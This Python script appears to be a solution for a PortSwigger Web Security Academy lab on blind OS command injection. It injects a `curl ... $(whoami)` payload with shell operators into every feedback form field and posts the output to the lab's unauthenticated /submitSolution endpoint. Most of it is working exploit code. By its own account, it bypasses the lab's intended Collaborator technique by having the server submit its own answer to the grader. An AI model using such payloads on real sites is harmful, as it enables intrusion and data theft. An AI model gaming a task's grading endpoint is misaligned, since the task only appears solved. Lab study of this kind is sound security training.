#!/usr/bin/env python3
"""
Blind OS command injection with out-of-band data exfiltration
PortSwigger Web Security Academy -- OS Command Injection

Companion script for the writeup: 05-blind-out-of-band-data-exfiltration.md

What this does:
    PortSwigger's intended technique layers data exfiltration on top of a
    licensed Burp Collaborator client -- embed `whoami` output in a DNS label
    via command substitution, then read the recovered subdomain out of
    Collaborator's interaction log. We didn't have that available, and the
    OAST auto-detection bypass from the previous lab only proves *that* an
    interaction happened, not what data was in it -- it can't hand back the
    actual command output.

    Instead this uses the "self-submit" bypass: every one of these labs
    exposes an unauthenticated /submitSolution endpoint on its own HTTPS
    listener. The injected command makes the backend curl that endpoint on
    itself, passing $(whoami)'s expanded output as the POST body -- the
    server exfiltrates the data to itself, no external infrastructure or
    Collaborator polling required. Two details are load-bearing: the full
    HTTPS lab URL is required (the server only listens on HTTPS, not plain
    HTTP on localhost/127.0.0.1), and curl needs -k to skip verification of
    the lab's self-signed certificate.

    The script sweeps all four form fields x three operators with this
    self-submit payload, then polls the lab's root page on a backoff for the
    "Congratulations" banner that appears once the server-side curl call has
    gone out and /submitSolution has accepted it.

Usage:
    python 05-blind-out-of-band-data-exfiltration.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx

OPERATORS = ["||", "&", ";"]
PARAMS = ["email", "name", "subject", "message"]


def get_csrf(client: httpx.Client, feedback_url: str) -> str:
    r = client.get(feedback_url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not m:
        m = re.search(r'value="([^"]+)"\s+name="csrf"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    feedback_url = f"{lab_url}/feedback"
    submit_url = f"{lab_url}/feedback/submit"

    csrf = get_csrf(client, feedback_url)
    base_data = {
        "csrf": csrf, "name": "test", "email": "test@test.com",
        "subject": "test", "message": "test",
    }

    print("[*] Self-submit bypass: server will curl its own /submitSolution with $(whoami)")

    total = 0
    for param in PARAMS:
        for op in OPERATORS:
            curl_cmd = f"curl -k {lab_url}/submitSolution -d answer=$(whoami)"
            prefix = base_data.get(param, "x")
            payload = f"{prefix}{op}{curl_cmd}{op}"
            data = {**base_data, param: payload}
            try:
                client.post(submit_url, data=data)
                total += 1
            except Exception:
                pass

    print(f"[*] Sent {total} self-submit payloads (curl -k {lab_url}/submitSolution)")
    print("[*] Waiting for the server-side curl call to land and be accepted...")

    for wait in (5, 5, 10, 10, 15):
        time.sleep(wait)
        r = client.get(lab_url)
        if "congratulations" in r.text.lower():
            print("[+] Lab solved -- whoami output was self-submitted as the answer.")
            return
        print(f"    still waiting ({wait}s)...")

    print("[-] Not solved after 45s. Try re-running.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
